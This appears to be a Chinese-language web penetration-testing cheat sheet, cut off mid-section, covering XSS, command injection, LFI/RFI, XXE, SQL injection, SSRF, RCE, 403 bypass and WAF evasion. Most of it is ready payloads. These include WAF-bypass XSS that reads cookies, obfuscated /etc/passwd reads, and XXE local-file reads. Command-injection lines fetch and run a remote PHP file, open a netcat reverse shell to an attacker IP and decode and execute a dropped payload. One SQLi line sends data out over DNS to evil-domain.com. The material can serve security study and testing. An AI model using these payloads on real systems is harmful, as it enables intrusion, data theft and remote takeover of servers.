</p><ol><li><p>反射型XSS<br>工作原理：恶意脚本从网站服务器反射回用户。这种情况通常发生在用户输入未经过适当消毒或编码就包含在响应中的情况下。</p><pre><code> ○ 示例：搜索栏在结果页面显示搜索查询时未对特殊字符进行编码。攻击者可在搜索查询中注入脚本，然后在受害者查看结果时在其浏览器中执行该脚本。</code></pre></li><li><p>存储型XSS<br>工作原理：恶意脚本存储在网站服务器上，每次加载受影响页面时都会执行。这种情况可能发生在评论区、论坛或其他存储用户生成内容的区域。</p><pre><code> ○ 示例：包含脚本的博客评论。每次有人浏览该评论时，脚本就会在其浏览器中执行</code></pre></li><li><p>dom型xss<br>工作原理：恶意脚本是通过修改页面的文档对象模型 (DOM) 而执行的。当用户输入被用于动态更新页面内容而未进行适当消毒时，就会发生这种情况。</p><pre><code> ○ 示例：一个使用 JavaScript 根据用户输入更新 URL 的网站。攻击者可在 URL 中注入脚本，然后在 JavaScript 代码运行时执行该脚本</code></pre></li></ol><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">&lt;img src=x onerror=alert(&#x27;XSS&#x27;)&gt;</span><br><span class="line">&quot;&gt;&lt;script&gt;alert(&#x27;XSS&#x27;)&lt;/script&gt;</span><br><span class="line">javascript:alert(&#x27;XSS&#x27;)</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">document.url</span><br><span class="line">document.documentURI</span><br><span class="line">document.URLUnencoded</span><br><span class="line">document.baseURI</span><br><span class="line">document.referrer</span><br><span class="line">location</span><br><span class="line">location.href</span><br><span class="line">loaction.search</span><br><span class="line">location.hash</span><br><span class="line">location.pathname</span><br><span class="line">window.cookie</span><br><span class="line">window.referrer</span><br><span class="line">window.name</span><br><span class="line"></span><br><span class="line">element.innerHTML()</span><br><span class="line">element.outerHTML()</span><br><span class="line">eval()</span><br><span class="line">setTimeout()</span><br><span class="line">setInterval()</span><br><span class="line">documemt.write()</span><br><span class="line">document.writeln()</span><br></pre></td></tr></table></figure><h3 id="绕waf的xss"><a href="#绕waf的xss" class="headerlink" title="绕waf的xss"></a>绕waf的xss</h3><p>CloudFlare WAF</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=alert&amp;#0000000040document.cookie)&gt; </span><br><span class="line">&lt;svg/oNLY%3d1/**/On+ONLoaD%3dco\u006efirm%26%23x28%3b%26%23x29%3b&gt; </span><br><span class="line">&lt;Svg Only=1 OnLoad=confirm(atob(&quot;Q2xvdWRmbGFyZSBCeXBhc3NLZCA6KQ==&quot;))&gt;</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><figcaption><span>WAF</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;details/open/ontoggle=confirm(&#x27;XSS&#x27;)&gt;</span><br><span class="line">6&#x27;%22()%26%25%22%3E%3Csvg/onload=prompt(1)%3E/</span><br><span class="line">;window/*aabb*/[&#x27;al&#x27;%2b&#x27;ert&#x27;](document./*aabb*/Location);</span><br><span class="line">&quot;&gt;%0D%0A%0D%0A&lt;x &#x27;=&quot;foo&quot;&gt;&lt;x foo=&#x27;&gt;&lt;img src=x onerror=javascript:alert(cloudfrontbypass)//&gt;</span><br></pre></td></tr></table></figure><h2 id="指令注入"><a href="#指令注入" class="headerlink" title="指令注入"></a>指令注入</h2><p>首先是常见的连接符<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&amp;</span><br><span class="line">;</span><br><span class="line">Newline (0x0a or \n)</span><br><span class="line">&amp;&amp;</span><br><span class="line">|</span><br><span class="line">||</span><br></pre></td></tr></table></figure></p><p>试例<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.x.x.x||ping+-c+10+127.0.0.1||</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">x.x.x.x||whoami&gt;/var/www/images/output.txt||</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">x.x.x.x||nslookup+burp.collaborator.address||</span><br><span class="line">x.x.x.x||nslookup+`whoami`.burp.collaborator.address||</span><br></pre></td></tr></table></figure><h3 id="常见参数"><a href="#常见参数" class="headerlink" title="常见参数"></a>常见参数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">cmd</span><br><span class="line">exec</span><br><span class="line">command</span><br><span class="line">execute</span><br><span class="line">ping</span><br><span class="line">query</span><br><span class="line">jump</span><br><span class="line">code</span><br><span class="line">reg</span><br><span class="line">do</span><br><span class="line">func</span><br><span class="line">arg</span><br><span class="line">option</span><br><span class="line">load</span><br><span class="line">process</span><br><span class="line">step</span><br><span class="line">read</span><br><span class="line">function</span><br><span class="line">req</span><br><span class="line">feature</span><br><span class="line">exe</span><br><span class="line">module</span><br><span class="line">payload</span><br><span class="line">run</span><br><span class="line">print</span><br></pre></td></tr></table></figure><h3 id="常见命令"><a href="#常见命令" class="headerlink" title="常见命令"></a>常见命令</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ifconfig</span><br><span class="line">ls</span><br><span class="line">uname -a</span><br></pre></td></tr></table></figure><h3 id="常见命令视窗"><a href="#常见命令视窗" class="headerlink" title="常见命令视窗"></a>常见命令视窗</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">whoami</span><br><span class="line">ipconfig</span><br><span class="line">dir</span><br><span class="line">ver</span><br></pre></td></tr></table></figure><h3 id="抓取密码"><a href="#抓取密码" class="headerlink" title="抓取密码"></a>抓取密码</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">cat /etc/passwd</span><br><span class="line">cat /e”t”c/pa”s”swd</span><br><span class="line">cat /’e’tc/pa’s’ swd</span><br><span class="line">cat /etc/pa??wd</span><br><span class="line">cat /etc/pa*wd</span><br><span class="line">cat /et’ ‘c/passw’ ‘d</span><br><span class="line">cat /et$()c/pa$()$swd</span><br><span class="line">&#123;cat,/etc/passwd&#125;</span><br><span class="line">cat /???/?????d</span><br></pre></td></tr></table></figure><h3 id="绕过waf"><a href="#绕过waf" class="headerlink" title="绕过waf"></a>绕过waf</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">vuln=127.0.0.1 %0a wget https://evil.txt/reverse.txt -O /tmp/reverse.php %0a php /tmp/reverse.php</span><br><span class="line">vuln=127.0.0.1%0anohup nc -e /bin/bash &lt;attacker-ip&gt; &lt;attacker-port&gt;</span><br><span class="line">vuln=echo PAYLOAD &gt; /tmp/payload.txt; cat /tmp/payload.txt | base64 -d &gt; /tmp/payload; chmod 744 /tmp/payload; /tmp/payload</span><br></pre></td></tr></table></figure><h3 id="lfi-rfi-文件包含"><a href="#lfi-rfi-文件包含" class="headerlink" title="lfi-rfi 文件包含"></a>lfi-rfi 文件包含</h3><p>如何识别lfi</p><ol><li>参数篡改：<br>查找包含 page=、file=、doc= 等参数的 URL。这些通常就是漏洞所在.</li><li>目录遍历：<br>尝试在参数值中添加 ../ （点斜线）。这将尝试向上浏览文件系统。如果看到不同的内容或错误，你可能发现了一些问题.</li><li>空字节注入：<br>在文件路径末尾添加空字节 (%00)。有些系统会在空字节后停止处理，从而有可能绕过过滤器。</li><li>日志文件中毒：<br>如果能在日志文件中注入代码，就有可能通过 LFI 触发它。这是一种更高级的技术</li></ol><p>思路</p><p><img src="https://pic1.imgdb.cn/item/6780bac4d0e0a243d4f2f488.png" alt=""></p><p>LFI全名实际上是Load File Inclusion，即本地文件包含漏洞</p><p>所以比较常见的就是<code>..\etc\passwd</code></p><p>like this<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[ <span class="string">&#x27;page&#x27;</span> ];</span><br><span class="line"></span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;http://&quot;</span>, <span class="string">&quot;https://&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>( <span class="keyword">array</span>( <span class="string">&quot;../&quot;</span>, <span class="string">&quot;..\&quot;&quot;</span> ), <span class="string">&quot;&quot;</span>, <span class="variable">$file</span> );</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><br><code>$_GET[&#39;page&#39;];</code>这个就是我们可以注入的地方,页面通过提取URL查询page参数的值，<br><code>str_replace( array( &quot;http://&quot;, &quot;https://&quot; ), &quot;&quot;, $file );</code>删除了http和https<br><code>str_replace( array( &quot;../&quot;, &quot;..\&quot;&quot; ), &quot;&quot;, $file );</code>删除了../和..”</p><p>所以综上，我们可以用这个`…/./…/./…/./…/./…/./</p><p>而RFI全名实际上是Remote File Inclusion，即远程文件包含漏洞</p><p>所以一般都是带IP的恶意文件</p><p>在<a href="https://www.revshells.com/">reverse shell generator</a>下载反向链接脚本，并连接</p><h2 id="xxe-—just-xxe"><a href="#xxe-—just-xxe" class="headerlink" title="xxe —just xxe"></a>xxe —just xxe</h2><p>我就说一句，在线测试工具和发包格式<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">http://ceye.io/</span><br><span class="line"></span><br><span class="line">http://www.dnslog.cn/</span><br><span class="line"></span><br><span class="line">https://dnslog.io/</span><br></pre></td></tr></table></figure></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Type: application/xml</span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE test [ &lt;!ENTITY % xxe SYSTEM &quot;http://127.0.0.1:80&quot; &gt; %xxe; ]&gt;</span><br><span class="line"></span><br><span class="line"># or </span><br><span class="line"></span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;http://127.0.0.1:80&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;/r&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"># pyload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;r&gt;&amp;sp;&lt;/r&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;response&gt;&lt;header&gt;&lt;actionCode&gt;1&lt;/actionCode&gt;&lt;rspType&gt;7&lt;/rspType&gt;&lt;rspCode&gt;9011&lt;/rspCode&gt;&lt;rspDesc&gt;&lt;![CDATA[请求报文头部不能为空]]&gt;&lt;/rspDesc&gt;&lt;digitalSign /&gt;&lt;rspTime&gt;2020-04-09 16:58:34.877&lt;/rspTime&gt;&lt;/header&gt;&lt;body&gt;&lt;/body&gt;&lt;/response&gt;</span><br><span class="line"></span><br><span class="line"># pyload</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; ?&gt;</span><br><span class="line">&lt;!DOCTYPE r [</span><br><span class="line">&lt;!ELEMENT r ANY &gt;</span><br><span class="line">&lt;!ENTITY sp SYSTEM &quot;file:///c:/windows/system32/drivers/etc/hosts1&quot;&gt;</span><br><span class="line">]&gt;</span><br><span class="line"></span><br><span class="line">&lt;r&gt;&amp;sp;&lt;/r&gt;</span><br><span class="line"></span><br><span class="line"># response</span><br><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;&lt;response&gt;&lt;header&gt;&lt;actionCode&gt;1&lt;/actionCode&gt;&lt;rspType&gt;7&lt;/rspType&gt;&lt;rspCode&gt;7000&lt;/rspCode&gt;&lt;rspDesc&gt;&lt;![CDATA[接口程序执行错误]]&gt;&lt;/rspDesc&gt;&lt;digitalSign /&gt;&lt;rspTime&gt;2020-04-09 17:01:08.121&lt;/rspTime&gt;&lt;/header&gt;&lt;body&gt;&lt;/body&gt;&lt;/response&gt;</span><br></pre></td></tr></table></figure><p>—&gt;<a href="https://xz.aliyun.com/t/6887?time__1311=n4%2BxnD0Dg7excGiD%2FAe0%3DGOD9l9eDCWRR0IYeD">从XML相关一步一步到XXE漏洞</a></p><p>—&gt;<a href="https://www.cnblogs.com/mysticbinary/p/12668547.html">XXE漏洞的利用</a></p><h2 id="sqli-—绕不过的"><a href="#sqli-—绕不过的" class="headerlink" title="sqli —绕不过的"></a>sqli —绕不过的</h2><p>报错注入,联合注入，盲注….</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">经典 SQLI</span><br><span class="line"> 基于错误的 SQLi：</span><br><span class="line">        输入：&#x27; OR 1=1 -- （单引号后加 OR 1=1 和注释）</span><br><span class="line">        预期结果：显示 SQL 语法或表/列名称的数据库错误信息。</span><br><span class="line">        为什么有效？OR 1=1 条件始终为真，导致查询返回所有行，注释 (--) 实际上忽略了原始查询的其余部分。</span><br><span class="line"></span><br><span class="line">    基于联合的 SQLi：</span><br><span class="line">        输入：&#x27; UNION SELECT username, password FROM users --</span><br><span class="line">        预期结果：如果存在漏洞，应用程序将从 &quot;users &quot;表中返回用户名和密码以及原始查询结果。</span><br><span class="line">        为什么有效UNION 运算符结合了两个 SELECT 语句的结果，允许攻击者从其他表中检索数据</span><br><span class="line"></span><br><span class="line">盲 SQLi</span><br><span class="line"></span><br><span class="line">    基于布尔的 SQLi：</span><br><span class="line">        输入： &#x27; AND 1=1 -- （真条件）</span><br><span class="line">        预期结果：应用程序的响应应与正常请求相同。</span><br><span class="line">        输入： &#x27; AND 1=2 -- （错误条件）</span><br><span class="line">        预期结果：应用程序的响应应不同于正常请求。</span><br><span class="line">        为什么有效：攻击者可以通过观察应用程序的响应如何随注入条件的变化而变化来推断数据库的信息</span><br><span class="line"></span><br><span class="line">    基于时间的 SQLi：</span><br><span class="line">        输入： &#x27; AND SLEEP(5) -- （休眠 5 秒钟）</span><br><span class="line">        预期结果：如果注入成功，应用程序的响应将延迟 5 秒。</span><br><span class="line">        ○ 为何有效：SLEEP 功能会使数据库在指定时间内暂停，攻击者可以通过观察响应时间来推断注入是否有效。</span><br><span class="line"></span><br><span class="line">外部 SQLI</span><br><span class="line"></span><br><span class="line">    基于 DNS 的渗透：</span><br><span class="line">        输入： &#x27; UNION SELECT LOAD_FILE(concat(&#x27;\\\\&#x27;,@@version,&#x27;.evil-domain.com\\abc&#x27;))-- </span><br></pre></td></tr></table></figure><p>——&gt; <code>[python脚本/sqli]</code>自己写的测试小脚本</p><h2 id="ssrf-1"><a href="#ssrf-1" class="headerlink" title="ssrf"></a>ssrf</h2><p>ssrf分为五类，分别是</p><ol><li>基本 SSRF：<br>攻击者可以访问互联网上任何可公开访问的资源。</li><li>盲人 SSRF：<br>攻击者无法看到服务器端请求的响应，但仍可根据应用程序的行为推断信息。</li><li>带身份验证旁路的 SSRF：<br>攻击者可以绕过身份验证机制访问受限资源。</li><li>SSRF 到 Localhost：<br>攻击者可以访问与网络应用程序运行在同一服务器上的服务。</li><li>SSRF 到云元数据端点：<br>攻击者可访问存储在云元数据服务中的敏感信息</li></ol><p>tools：ffuf/Kiterunner/SSRFmap</p><p>可以看看这个师傅的，很详细的描述了ssrf实例和绕过手法</p><p><a href="https://www.freebuf.com/articles/web/333318.html">从0到1完全掌握 SSRF</a></p><p>不过这个我也是第一次见完整的</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[协议类型]://[访问资源需要的凭证信息]@[服务器地址]:[端口号]/[资源层级UNIX文件路径][文件名]?[查询]#[片段ID]</span><br></pre></td></tr></table></figure><p><a href="https://xz.aliyun.com/t/7495?time__1311=n4%2BxnD0Dy7GQ3AKeD5DsA3rxIx7T5%2BAO4Y5qRUQx">DNS重绑定</a></p><p>看不懂的话可以看这个<a href="https://blog.csdn.net/qq_36348899/article/details/119297854">详解DNS重绑定攻击</a></p><h2 id="rce-1"><a href="#rce-1" class="headerlink" title="rce"></a>rce</h2><p>当攻击者诱使网络应用程序或系统执行他们提供的代码时，就会出现 RCE 漏洞。这些代码可以是简单的命令，也可以是复杂的脚本，可用于执行各种恶意活动</p><h3 id="RCE危害"><a href="#RCE危害" class="headerlink" title="RCE危害"></a>RCE危害</h3><p>目标系统执行攻击者的有效载荷，允许攻击者运行其代码，并有可能获得系统的控制权 攻击者的收益：攻击者现在可以执行各种操作，例如<br>窃取敏感数据<br>安装恶意软件<br>修改系统文件<br>发动进一步攻击</p><h3 id="RCE类型"><a href="#RCE类型" class="headerlink" title="RCE类型"></a>RCE类型</h3><ul><li>命令注入：攻击者可将操作系统命令注入网络应用程序的输入中</li><li>代码注入：代码注入：攻击者将代码注入网络应用程序的输入，然后由应用程序的解释器（如 PHP、Python、Java）执行 </li><li>反序列化漏洞：当序列化数据被应用程序反序列化时，攻击者可以操纵序列化数据执行任意代码 </li><li>文件上传漏洞：攻击者可将恶意文件上传到网络应用程序，然后在服务器上执行该文件</li></ul><p>（原来文件上传和反序列化也算rce么）</p><h3 id="简单的rce载荷"><a href="#简单的rce载荷" class="headerlink" title="简单的rce载荷"></a>简单的rce载荷</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">; whoami</span><br><span class="line">$(whoami)</span><br><span class="line">| whoami</span><br><span class="line">|| whoami</span><br><span class="line">&amp;&amp; whoami</span><br></pre></td></tr></table></figure><h3 id="顺便一提-SSTI模板注入"><a href="#顺便一提-SSTI模板注入" class="headerlink" title="顺便一提   SSTI模板注入"></a>顺便一提   SSTI模板注入</h3><p><img src="https://pic1.imgdb.cn/item/678334d3d0e0a243d4f389ac.png" alt=""></p><p>图片来源—&gt;<a href="https://www.cnblogs.com/JKding233/p/17725100.html">JKding233师傅</a></p><p><a href="https://www.cnblogs.com/bmjoker/p/13508538.html">SSTI（模板注入）漏洞（入门篇）</a></p><p><strong>墙裂推荐</strong>上面那篇，师傅很详细的列举了多种模板的SSTI</p><h2 id="403-bypass"><a href="#403-bypass" class="headerlink" title="403-bypass"></a>403-bypass</h2><p>404是not found，403是forbidden，也就是禁止访问</p><p>比较常见的绕过就是</p><ol><li>换请求方法，换成<code>GET, HEAD, POST, PUT, DELETE, CONNECT, OPTIONS, TRACE, PATCH, INVENTED, HACK</code></li><li><p>绕过Ip限制</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">X-Originating-IP: 127.0.0.1</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">X-Forwarded: 127.0.0.1</span><br><span class="line">Forwarded-For: 127.0.0.1</span><br><span class="line">X-Remote-IP: 127.0.0.1</span><br><span class="line">X-Remote-Addr: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">X-Original-URL: 127.0.0.1</span><br><span class="line">Client-IP: 127.0.0.1</span><br><span class="line">True-Client-IP: 127.0.0.1</span><br><span class="line">Cluster-Client-IP: 127.0.0.1</span><br><span class="line">X-ProxyUser-Ip: 127.0.0.1</span><br><span class="line">Host: localhost</span><br></pre></td></tr></table></figure></li><li><p>url绕过<br>通过使用<code>X-Original-URL</code>头部，或者<code>X-Rewrite-URL</code>等覆盖原来请求URL的路径</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">GET / HTTP/1.1</span><br><span class="line">X-Original-URL: /admin/console</span><br><span class="line">X-Rewrite-URL: /admin/console</span><br><span class="line">Host: www.abc.com</span><br><span class="line">Host: 192.168.126.6</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>路径fuzz，比如<code>/admin/</code>改成<code>/admin</code>或者<code>/admin/./</code>等等</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">abc.com/admin =&gt; 403</span><br><span class="line">abc.com/admin/ =&gt; 200</span><br><span class="line">abc.com/admin// =&gt; 200</span><br><span class="line">abc.com//admin// =&gt; 200</span><br><span class="line">abc.com/admin/* =&gt; 200</span><br><span class="line">abc.com/admin/*/ =&gt; 200</span><br><span class="line">abc.com/admin/. =&gt; 200</span><br><span class="line">abc.com/admin/./ =&gt; 200</span><br><span class="line">abc.com/./admin/./ =&gt; 200</span><br><span class="line">abc.com/admin/./. =&gt; 200</span><br><span class="line">abc.com/admin/./. =&gt; 200</span><br><span class="line">abc.com/admin? =&gt; 200</span><br><span class="line">abc.com/admin?? =&gt; 200</span><br><span class="line">abc.com/admin??? =&gt; 200</span><br><span class="line">abc.com/admin…;/ =&gt; 200</span><br><span class="line">abc.com/admin/…;/ =&gt; 200</span><br><span class="line">abc.com/%2f/admin =&gt; 200</span><br><span class="line">abc.com/%2e/admin =&gt; 200</span><br><span class="line">abc.com/admin%20/ =&gt; 200</span><br><span class="line">abc.com/admin%09/ =&gt; 200</span><br><span class="line">abc.com/%20admin%20/ =&gt; 200</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>其他的<a href="https://github.com/cpkkcb/fuzzDicts">fuzz-dicts</a></p></li></ol><h2 id="waf-bypass"><a href="#waf-bypass" class="headerlink" title="waf-bypass"></a>waf-bypass</h2><p>🤔<br>🤔<br>🤔<br>🤔<br>🤔<br>🤔</p><p>tools：wafw00f/BYPASSwaf/</p><p>绕过手法：</p><ul><li>1.大小写绕过<br>像是这样<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line">&lt;script&gt;<span class="title function_ invoke__">confirm</span>()&lt;/script&gt; </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> &lt;ScrIpT&gt;<span class="title function_ invoke__">confirm</span>()&lt;/sCRiPt&gt; </span><br><span class="line"></span><br><span class="line">基本要求：</span><br><span class="line"></span><br><span class="line">SELECT * FROM * WHERE OWNER = <span class="string">&#x27;NAME_OF_DB&#x27;</span></span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line">sELeCt * fRoM * wHerE OWNER = <span class="string">&#x27;NAME_OF_DB&#x27;</span> </span><br></pre></td></tr></table></figure></li><li>URL编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> &lt;Svg/x=&quot;&gt;&quot;/OnLoAD=confirm()// </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> %3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F </span><br><span class="line"></span><br><span class="line">被 WAF 屏蔽：</span><br><span class="line"></span><br><span class="line"> UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10) </span><br><span class="line"></span><br><span class="line">旁路技术：</span><br><span class="line"></span><br><span class="line"> UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29 </span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>ASCII编码<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span 